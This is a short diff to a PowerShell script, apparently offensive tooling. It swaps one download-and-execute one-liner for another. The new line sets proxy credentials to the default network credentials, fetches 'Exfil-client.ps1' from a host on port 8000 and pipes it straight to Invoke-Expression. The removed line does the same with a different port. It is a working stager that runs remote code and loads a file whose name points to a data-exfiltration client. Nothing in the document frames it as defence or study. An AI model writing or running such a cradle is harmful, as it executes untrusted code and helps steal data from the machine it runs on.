@@ -1,2 +1,2 @@
-$IP="127.0.0.1:9001"
-(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$IP')|iex
+$IP="127.0.0.1:8000"
+(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$IP/Exfil-client.ps1')|iex
